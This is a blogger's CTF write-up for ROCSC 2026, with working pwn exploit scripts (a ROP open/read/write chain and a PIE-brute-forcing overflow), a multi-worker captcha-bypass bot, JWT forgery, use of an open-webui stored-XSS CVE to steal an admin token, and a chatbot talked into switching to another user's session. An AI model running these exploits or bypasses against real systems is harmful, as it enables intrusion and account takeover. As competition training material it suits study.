+++
date = '2026-02-23'
draft = false
title = 'ROCSC 2026'
ShowToc = true
tags = ["ctf"]
+++

# Intro

This year's ROCSC was my first participation, and I ended up ranking 50, so I'm pretty proud about my performance. Sadly, the competition was crazy in the junior section, as the only people who qualified were those with a full solve, which almost never happens. But seniors ranked below me *did* qualify, so I'm a bit salty about that.

What was unfortunate was the AI thing, which essentially made this pay-to-win, since most challenges *were* solvable using AI; just mindlessly pumping challenges into Claude and GPT isn't fun, but not doing so puts you at a great disadvantage to people who do so. 

Either way, this was a great learning experience and 3 very long days with very little sleep. So here is what I solved and how.

# Pwn

I'll start with pwn because it's my favorite and what I solved first. 


## ropy

**ropy** was a simple enough ORW pwn challenge, which means we aren't allowed to execute any syscalls except *open*, *read* and *write*. Yet that is enough to read the flag. 

But there was a fun twist which was the first function called, opening a huge random amount of fd (file descriptors). To *read* from flag.txt in the first place, we need to pass its fd as a parameter. Since it wasn't the usual 3, the only way to actually get it, without guessing, was through the return value of `open(flag.txt)`, passed in rax.

To make this even more challenging, we only get a bunch of shit gadgets, all of which in libc.so.6, except for a `pop rdi; ret` to start the gadget chain from main.

![challenge-screenshot](ropy1.png#center)

So the action plan was:

- write "flag.txt" into bss
- open("flag.txt", 0, 0)
- retrieve rax, read(fd, bss+20, 100)
- write(1(stdout), bss+20, 100).

With that in mind, here is the full script I used, which worked first try!

```python
from pwn import *
elf = ELF('./main')
p=elf.process()

cyberedu = '34.40.29.248:30946'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#avem doar read write open, flag.txt e chiar langa binary; 

#main
#pop rdi; rei
pop_rdi_ret = 0x401316
ret = 0x40101a
puts_plt = 0x401150
puts_got = elf.got['puts']
puts_offset = 0x80e50

vuln = 0x401566

#bss
flag_str = 0x04040c0
flag_buf = 0x404200   # past BSS, writable page

# get libc for gadgets;
p.recvuntil(b"?\n")
#v1
payload = b"A"*128
#rbp
payload += b"B"*8
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(ret)
payload += p64(vuln)

p.sendline(payload)
data = p.recvline().strip()
val = u64(data.ljust(8, b"\x00"))
print(hex(val))

libc = val - puts_offset
print(f"Libc: {hex(libc)}")

#second gadget chain
p.recvuntil(b"?\n")
#v1
payload = b"A"*128
#rbp
payload += b"B"*8

#gadgets from libc
syscall = 0x29db4 + libc
syscall_ret = 0x91316 + libc
pop_rsi_ret = 0x2be51 +libc
pop_rdx_r12_ret = 0x011f357 + libc
mov_addr_rdx_rax_ret = 0x03a410 + libc
pop_rax_ret = 0x45eb0 + libc
pop_rcx_ret = 0x3d1ee + libc
pop_r8_mov_eax_1_ret = 0x165a56 + libc

#0x000000000005a272: mov rdi, rax; cmp rdx, rcx; jae 0x5a25c; mov rax, r8; ret; 
#yeah i know shut up
mov_rdi_rax_cmp_rdx_rcx_jae_5a25c_mov_rax_r8_ret = 0x5a272 + libc

#write to bss "flag.txt\0\0" to prepare for open
payload += p64(pop_rax_ret)
payload += p64(0x7478742e67616c66)   # "flag.txt"
payload += p64(pop_rdx_r12_ret)
payload += p64(flag_str)
payload += p64(0x0)
payload += p64(mov_addr_rdx_rax_ret)

# write null terminator (next 8 bytes = 0)
payload += p64(pop_rax_ret)
payload += p64(0)
payload += p64(pop_rdx_r12_ret)
payload += p64(flag_str + 8)
payload += p64(0x0)
payload += p64(mov_addr_rdx_rax_ret)           # [flag_str+8] = 0x00...

#open
# open("flag.txt", O_RDONLY) 
payload += p64(pop_rdi_ret)
payload += p64(flag_str)
payload += p64(pop_rsi_ret)
payload += p64(0)                     # O_RDONLY
payload += p64(pop_rax_ret)
payload += p64(2)                     # SYS_open
payload += p64(syscall_ret)
# rax = fd (unknown high number) 
#so now we need to store that fd;

#prepping for the weird gadget's conditions, so we dont jmp smwhere else
payload += p64(pop_rcx_ret)
payload += p64(0xffffffff)
payload += p64(pop_rdx_r12_ret)
payload += p64(0)
payload += p64(0)
#for now lets leave r8 alone;
# turns out it was ok, didnt even need to modify it
payload += p64(mov_rdi_rax_cmp_rdx_rcx_jae_5a25c_mov_rax_r8_ret)
#now rdi = fd

# just pop rax = 0 right after
payload += p64(pop_rax_ret)
payload += p64(0)                    # SYS_read


# now straight into read syscall
payload += p64(pop_rsi_ret)
payload += p64(flag_buf)
payload += p64(pop_rdx_r12_ret)
payload += p64(100)
payload += p64(0)
payload += p64(syscall_ret)          # read(fd, flag_buf, 100)

#now write
#  write(1, flag_buf, 100) 
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_ret)
payload += p64(flag_buf)
payload += p64(pop_rdx_r12_ret)
payload += p64(100)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(1)                     # SYS_write
payload += p64(syscall_ret)

p.sendline(payload)
p.interactive()
```

![challenge-screenshot](first-try.png#center)

## directory

This one was also pretty nice, but I didn't really understand how the stack layout looked properly, and I'll explain why in a minute.

We had a menu, with options, out of which are interesting:

- Exit and return
- Add entry to directory (overflow, we can write 48 bytes instead of 20 or sth)

We can add up to 9 entries, each at `memcpy(&v2[20 * v1++ + 264], v2, v4[0]);`.

![challenge-screenshot](dire1.png#center)

But looking at the stack layout, this just completely overflows v2, and by the third entry we should already be writing to `v2 + 320` where `rip` lives. Since we have a `win` function, we just need to change `rip`'s lower bytes to `1537`, and that would be enough.

![challenge-screenshot](dire2.png#center)

But that wasn't the case, so either my math was wrong or IDA was wrong or whatever. But luckily, we can use `gef`. I determined that we only start writing into `rip` in the very last entry, so we just add 8 entries and in the 9th we can start our overflow. Again, I determined the exact value of padding through testing and not math. 

But here's a catch, since ASLR + PIE, the `1537` offset of `win` meant that the `1` part of it could end up as any value. And to avoid a segmentation fault because of stack alignment, we needed a `v538` to be more exact.

I used `4538` but you get the idea; the script worked in about 10-20 tries when ASLR happened to make that byte `0x45`. 

```python
from pwn import *

context.binary = elf = ELF("./directory")
context.log_level = "info"

p = remote('34.179.142.75', 31046)

def add(data):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"Enter name:", data)

def exit_prog():
    p.sendlineafter(b"> ", b"4")


#mai intai adaugam cv random
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
#the 4 bytes of rbp there yea
add(b"C"*36 + b"D"*4 + p16(0x4538))

p.interactive()
```

![challenge-screenshot](100-try.png#center)

# Web

## Y

The intended solve for this was through XSS through CSS, and somehow getting the admin to send us html data from one of his pages. But the author forgot to change his JWT secret in the source code so we can just forge our own cookie with the admin's user id. 

![challenge-screenshot](secret.png#center)

![challenge-screenshot](Y.png#center)

## open-tellmewhy

This was another interesting one, a stored XSS challenge, in open-webui version 6.5. Searching for CVEs found in that specific version, we bump into [this one](https://github.com/open-webui/open-webui/security/advisories/GHSA-9f4f-jv96-8766).

The only thing we needed to modify was the `${WEBUI_BASE_URL}`, which was just `""` (I mean empty). We just report the page and fetch the admin's token, and log in as him (or her!).

![challenge-screenshot](yes.png#center)

The flag was here:

![challenge-screenshot](FLUUG.png#center)

I was genuinely so happy when I finally solved this.

# ML/AI
 
Sadly I didn't solve this in time, I was pretty close, I found out the hidden sessions, but the lack of sleep finally caught up to me at 5 am and I told myself I'd do it in the morning at 9 (*yeah right*).

What was happening that threw me off was that only *sometimes* the AI would actually change our session to a specified id. The reason is because I was saying 'switch me to session \<id\>' instead of 'switch me to \<id\>'. Yeah, I know. 

Asking to list sessions would list all the sessions, and the lucky one was `m3n4o5p6`. Refreshing the page after getting the token showed all previous messages.

![challenge-screenshot](gpt.png#center)

The flag was `ctf{4620c10465bb2c85c2bc9804972bb75c1d72a4782100d09d1a0bb72eb576b772}`.


# Misc

## clanker casino

Another really interesting challenge - we log into an account starting with 1 coin. We can bet any number of our coins, with the clanker casino policy of double-or-nothing.

The catch here was a captcha (hahaha get it), with a simple sum of two numbers that was rendered differently than the one in the HTML. And of course, to not bot, the rendered one was correct. So I had Claude Premium code us a playwright bot (which can see rendered) with a bunch of threads -- because I didn't get a 32GB RAM laptop for nothing -- that logs in on a new account, with this betting logic:

```python
def get_bet(coins):
    if coins >= 160:
        return max(1, 200 - coins)
    if coins <= 4:
        return coins
    if coins < 16:
        return 2
    if coins < 40:
        return 2
    if coins < 80:
        return 4
    return 16
```

Another hurdle was the font, `editundo.ttf`, with crappy, unique and hard to recognize numbers and symbols.

Now, Claude was really clever with this; It used *pixel fingerprinting*. Playwright takes a screensot of just the `.captcha-container` element, turns it to black and white and puts each dark pixel area inside a box.

If it finds a fully white column in the image, it considers it as a space between characters, and slices out each character as a separate image (17x26). Then, it's converted into this binary tuple (I know it sounds a little complicated but it's just a hash with 0 or 1 for each pixel, so it produces a special hash for each of the characters to recognize them faster).

Also the symbol in the middle was always regarded as a plus.

Then, it looks it up in a `DIGIT_MAP`. This `DIGIT_MAP` is essentially an array of all these hashes. It starts as empty, and it displays each character in ASCII in the terminal for the user to write what the number character is, if it hasn't seen it before.

Then, when the map is done, the Playwright friend of our can bypass the captcha by itself, and, you'll get the flag at 200 coins! 

This script launched 10 workers and got the flag in *seconds*. But depending on your luck, it could take longer.

![challenge-screenshot](web.png#center)

```python
import re
import asyncio
import itertools
import numpy as np
from PIL import Image
import io
from playwright.async_api import async_playwright

BASE = "http://34.185.144.221:31082"
NUM_WORKERS = 10

DIGIT_MAP = {}
map_lock = asyncio.Lock()
input_lock = asyncio.Lock()
flag_found = asyncio.Event()

# Each worker gets its own counter in a completely separate range
# Worker 1: 11000100, 11000101, ...
# Worker 2: 22000200, 22000201, ...
# etc.
def make_counter(worker_id):
    return itertools.count(worker_id * 11000100)

def check_flag(text):
    for pattern in [r'ctf\{.*?\}', r'ROCSC\{.*?\}', r'CTF\{.*?\}', r'FLAG\{.*?\}']:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group()
    return None

def extract_segments(screenshot_bytes):
    img = Image.open(io.BytesIO(screenshot_bytes)).convert('L')
    inner = img.crop((3, 3, img.width-3, img.height-3))
    arr = np.array(inner) < 50
    rows = np.any(arr, axis=1)
    cols = np.any(arr, axis=0)
    if not rows.any():
        return [], None
    rmin, rmax = np.where(rows)[0][[0, -1]]
    cmin, cmax = np.where(cols)[0][[0, -1]]
    cropped = arr[max(0,rmin-2):rmax+2, max(0,cmin-2):cmax+2]
    col_proj = np.sum(cropped, axis=0)
    in_char = False
    segments = []
    start = 0
    for x in range(len(col_proj)):
        if not in_char and col_proj[x] > 0:
            in_char = True; start = x
        elif in_char and col_proj[x] == 0:
            in_char = False; segments.append([start, x])
    if in_char:
        segments.append([start, len(col_proj)])
    if not segments:
        return [], None
    # Captcha is always exactly 5 chars: D D + D D
    # Merge closest pairs until we have exactly 5
    while len(segments) > 5:
        gaps = [segments[i+1][0] - segments[i][1] for i in range(len(segments)-1)]
        min_idx = gaps.index(min(gaps))
        segments[min_idx][1] = segments[min_idx+1][1]
        segments.pop(min_idx+1)
    return [cropped[:, x1:x2] for x1, x2 in segments], cropped

def seg_to_hash(seg):
    img = Image.fromarray(seg.astype(np.uint8) * 255)
    img = img.resize((17, 26), Image.NEAREST)
    return tuple(np.array(img).flatten() > 128)

def decode_captcha(screenshot_bytes):
    segs, _ = extract_segments(screenshot_bytes)
    if not segs:
        return None, []
    result = ''
    unknowns = []
    for i, seg in enumerate(segs):
        # Position 2 (middle of 5) is always the + sign
        if i == 2:
            result += '+'
            continue
        h = seg_to_hash(seg)
        if h in DIGIT_MAP:
            result += DIGIT_MAP[h]
        else:
            result += '?'
            unknowns.append((i, seg, h))
    return result, unknowns

def seed_from_known_captcha():
    try:
        with open('captcha_test.png', 'rb') as f:
            data = f.read()
        segs, _ = extract_segments(data)
        known = ['0', '9', '+', '9', '2']
        if len(segs) == len(known):
            for seg, label in zip(segs, known):
                DIGIT_MAP[seg_to_hash(seg)] = label
            print(f"[+] Seeded map: {set(known)} ({len(DIGIT_MAP)} entries)")
        else:
            print(f"[-] Seed failed: expected 5 segs, got {len(segs)}")
    except FileNotFoundError:
        print("[-] captcha_test.png not found, will learn interactively")

async def learn_unknown(seg, h, worker_id):
    async with input_lock:
        if h in DIGIT_MAP:
            return DIGIT_MAP[h]
        print(f"\n[W{worker_id}] Unknown character:")
        for row in seg:
            print('    ' + ''.join('██' if p else '  ' for p in row))
        print(f"    What digit/char is this? ", end='', flush=True)
        label = await asyncio.get_event_loop().run_in_executor(None, input)
        label = label.strip()
        if label:
            DIGIT_MAP[h] = label
            print(f"    [+] Learned '{label}' (map: {len(DIGIT_MAP)} entries)")
        return label

def get_bet(coins):
    if coins >= 100:
        return max(1, 200 - coins)  # one win reaches 200
    return max(1, coins // 2)       # bet half, fast growth

async def worker(worker_id, browser):
    counter = make_counter(worker_id)

    async def new_session():
        idx = next(counter)
        context = await browser.new_context()
        page = await context.new_page()
        await page.goto(f"{BASE}/register")
        await page.fill('input[name="username"]', str(idx))
        await page.fill('input[name="password"]', str(idx))
        await page.click('button[type="submit"]')
        print(f"[W{worker_id}] New account: {idx}")
        return context, page

    context, page = await new_session()

    while not flag_found.is_set():
        await page.goto(f"{BASE}/game")
        html = await page.content()
        flag = check_flag(html)
        if flag:
            print(f"\n[W{worker_id}] 🚩 FLAG: {flag}")
            flag_found.set()
            break

        hud_text = await page.inner_text('.hud')
        m = re.search(r'COINS: (\d+)', hud_text)
        if not m:
            continue
        coins = int(m.group(1))

        if coins == 0:
            print(f"[W{worker_id}] Busted!")
            await context.close()
            context, page = await new_session()
            continue

        element = await page.query_selector('.captcha-container')
        screenshot_bytes = await element.screenshot()
        decoded, unknowns = decode_captcha(screenshot_bytes)

        if unknowns:
            for uidx, seg, h in unknowns:
                if h in DIGIT_MAP:
                    continue
                label = await learn_unknown(seg, h, worker_id)
                if not label:
                    break
            decoded, unknowns = decode_captcha(screenshot_bytes)

        if not decoded or '?' in decoded:
            continue

        match = re.search(r'(\d+)\+(\d+)', decoded)
        if not match:
            continue

        solution = int(match.group(1)) + int(match.group(2))
        bet = get_bet(coins)
        print(f"[W{worker_id}] Coins:{coins} | {decoded}={solution} | bet:{bet} | map:{len(DIGIT_MAP)}")

        await page.fill('input[name="bet"]', str(bet))
        await page.fill('input[name="captcha_answer"]', str(solution))
        await page.click('button[type="submit"]')

        html = await page.content()
        flag = check_flag(html)
        if flag:
            print(f"\n[W{worker_id}] 🚩 FLAG: {flag}")
            flag_found.set()
            break

        try:
            flash = (await page.inner_text('.flash')).strip()
            print(f"[W{worker_id}]   => {flash}")
        except:
            pass

    await context.close()

async def main():
    seed_from_known_captcha()
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        print(f"[+] Launching {NUM_WORKERS} workers...")
        tasks = [asyncio.create_task(worker(i+1, browser)) for i in range(NUM_WORKERS)]
        await flag_found.wait()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        await browser.close()

asyncio.run(main())
```

## jail

Shamelessly I will admit Claude Premium clutched this, with absolutely zero human intervention. I didn't even bother figuring out why this was vulnerable here.

![challenge-screenshot](flug.png#center)

![challenge-screenshot](claud.png#center)

# Network

## Chimera Void

We get a pcap that we don't even need to open for this challenge, genuinely. If we take all the strings, first we get a bunch of 'A's for obfuscation I suppose, then data that looks like this: `G1 F1200 X40.000 Y80.800 E310291.75000`. A bit of research, and we find it is G-codes. [This writeup on a similar challenge](https://medium.com/@forwardsecrecy/hackmethod-august-2017-challenges-write-up-51a6ecbd3520) was very useful.

G-codes are data for 3d printers, so we just need an online-no-kali-install-please-gcode-emulator. I tried a bunch of websites which rendered like shit until I found [this winner](https://app.meshinspector.com/).

The command I used was `strings chimera_void.pcap | grep -v '^A' > gcode.txt`, and just popped the file into the mesh inspector. And here is the flag!

![challenge-screenshot](chim.png#center)

And written out, `CTF{CONGRATS_WINNERS}`.

# Mobile

I'm not really experienced with mobile rev, so these were purely vibe-coded *(vibe-hacked?)*.

## avault

I just gave Claude the apk and it made great progress. It figured out we needed a bunch of headers, and that the password needed to be "R4M_$tonks". These are the working commands it had me run, in order:

```bash
curl -k -H 'A-VALUT: x-monitor-client-921754' \
https://34.185.140.241:31454/anon
   ANON="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiY2xpZW50IjoiYW5kcm9pZF9jbGllbnQiLCJpYXQiOjE3NzE4NjUyNTIsImV4cCI6MTc3MTg2ODg1Mn0.LugXX6JwCpxTR-9fWkQzuVNZuu-Cy-IXtMeZlVIdk5Q"

curl -k -X POST https://34.185.140.241:31454/login \
 H 'Content-Type: application/json' \
 H 'A-VALUT: x-monitor-client-921754' \
 H "Authorization: Bearer $ANON" \
 d '{"password": "R4M_$tonks"}'
 JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiY2xpZW50IjoiYW5kcm9pZF9jbGllbnQiLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NzE4NjU0MTYsImV4cCI6MTc3MTg2OTAxNn0.HbdBDPbDzrMitfdK1PBRTF-FpiRml9btInZRhNw9N_0"
 
curl -k https://34.185.140.241:31454/feed \
 -H 'A-VALUT: x-monitor-client-921754' \
 -H "Authorization: Bearer $JWT"
 
curl -k -X POST https://34.185.140.241:31454/security/options \
 -H 'Content-Type: application/json' \
 -H 'A-VALUT: x-monitor-client-921754' \
 -H "Authorization: Bearer $JWT" \
 -d '{"door": "open"}'
 
curl -k -o feed_output https://34.185.140.241:31454/feed \
  -H 'A-VALUT: x-monitor-client-921754' \
  -H "Authorization: Bearer $JWT"
```

And we get a png file:

![challenge-screenshot](avault.png#center)

Since the image was also generated by AI I didn't feel that bad for my very little human intervention.


## In search of the lost note

So not just mobile, but also cryptography, how nice. This one was done COMPLETELY by ChatGPT Premium in half an hour.

![challenge-screenshot](mobi2.png#center)

![challenge-screenshot](mobi3.png#center)

But I'll still *try* to explain what exactly happens here. We already knew this, from the jadx-gui decompiled code:

```python
password = pin + ":" + pepper
key = PBKDF2-HMAC-SHA256(
    password,
    salt,
    iterations = 150000,
    dkLen = 32 bytes
)
```

The first thing served to us is the salt in `security.xml`. So we just needed to find out pepper and pin. And the nonce is derived from the Ts (timestamp).

```java
public final byte[] nonceFromTs(long ts) {
    byte[] b = new byte[16];
    long v = ts;
    for (int i = 0; i < 8; i++) {
        b[i] = (byte) (255 & v);
        v >>>= 8;
    }
    byte[] h = sha256(ArraysKt.plus(new byte[]{110, 111}, b));
    return ArraysKt.copyOfRange(h, 0, 12);
}
```

More exactly:

- The nonce will look like this: `nonce = SHA256( b"no" || (LE64(ts) || 8*0x00) )[0:12]`;

- A payload is generated like this: `payload = AES-GCM(key, nonce, plaintext)`;

- The decryption looks like this: `plaintext = AES-GCM-decrypt(key, nonceFromTs(created_at), payload)`.

Then, the note we were looking for, even though it was deleted from the main DB, can still be retrieved through `notes.db-wal`. WAL stands for Write-Ahead Log, which is a *journal mode in SQLite*. So it's just a log file.

Because our app forces `PRAGMA wal_autocheckpoint=0;`, the WAL doesn't get refreshed and data just keeps piling on. This is important because it stores both *created_at* and *ciphertext* (AKA FLAG!).

And since only one note was deleted from the db it was pretty obvious which one we needed to use (and yeah, the challenge name too).

So the password - `PBKDF2(pin + ":" + pepper, salt)`. The 8 digit pin is just a date, since there's dates on notes, which was just bruteforced from 1990 to 2025, as that's where most the notes were from. 

Now, about pepper, which can be reverse engineered from libcnative.so. It found it like so: `objdump -d -M intel app_unzipped/lib/x86_64/libnative.so | grep -n "Native_pepper"`. 

And the decompiled code was:

```C
for (i=0; i<LEN; i++) out[i] = enc[i] ^ 0x5A;
out[LEN] = 0;
return (*env)->NewStringUTF(env, out);
```

So just a simple xor! Lucky ChatGPT. The encoded pepper was in .rodata, and it just xor-ed it to decode it. And now, everything is complete, and we can decode the flag ciphertext! 

# OSINT

## museum

We're supposed to find the museum in which an art piece is located.

![challenge-screenshot](museum.jpg#center)

With a simple reverse search on the image we find a similar one with the same piece in some blog, including the building with the museum's name.

![challenge-screenshot](museum.png#center)

The flag: `ROCSC{sichuan_science_and_technology_museum}`


## wonderful-strangers

We find `memepie67` on roblox, following just one guy hinting to his youtube channel in his description, with a video of him reading out the flag character by character. [The video](https://www.youtube.com/watch?v=fpND-2ZLKbg).

Flag: `ROCSC{h0w_d0e5_h3_m0v3_l1k3_th1s}`

## art-gallery-heist-2

We're given a picture of an NFT, and through reverse search we find it belongs to the Ocean Racer League collection. By searching it on polygon, I found its owner's wallet address, `0xe31f336e1a6983c1a77e1ff7edeaaac1e5d088d3`.

Searching it in github, we find a repo with someone asking for donations at that address, unchainedmf. His bio hints at his Twitter account, which had posted the flag in base64. 

![challenge-screenshot](github.png#center)

This challenge took me way more than it looks, and in the process I thought I had to purchase one of the NFTs in the collection to join their discord server with a wallet verification bot. So here is my beautiful 0.3$ NFT in my portfolio:

![challenge-screenshot](nft.png#center)

And the flag was `ROCSC{n0_ch@in_c@n_ev3r_h0ld_me_d0wn}`.

# Steganography

## echoes_of_the_past

This one as another one of ChatGPT's artworks. And having done `strings`, we see that `Past Date=06.07.2022`. 

![challenge-screenshot](steg.png#center)

Going into Internet Archive at that specific data in that specific website, we see a user trying to log in.

![challenge-screenshot](steg2.png#center)

sha256-ing the username, we get the flag: `ROCSC{2a97516c354b68848cdbd8f54a226a0a55b21ed138e207ad6c5cbb9c00aa5aea}`.

---

Thank you for reading! The longer python scripts I made can be found [here](https://github.com/irinasusca/ctf-writeups/tree/main/rocsc2026). 
